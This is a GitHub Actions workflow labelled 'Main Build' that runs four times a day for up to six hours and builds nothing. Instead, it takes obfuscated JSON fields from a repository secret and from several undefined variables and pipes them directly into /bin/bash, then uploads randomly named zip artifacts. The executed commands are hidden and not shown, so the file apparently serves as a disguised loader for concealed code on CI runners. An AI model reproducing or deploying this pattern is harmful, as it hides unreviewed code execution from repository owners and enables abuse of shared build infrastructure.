name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '35 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          gqp10: ${{ secrets.gqp10 }}
        run: |
          printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
          echo $zczn1074 | jq -r .u920 | /bin/bash
          printf '%s' "$r73" | jq -r .xr256 | /bin/bash
          printf '%s' "$nuykk978" | jq -r .t8981 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: ZduDyyNx
          path: "*.zip"
          retention-days: 1
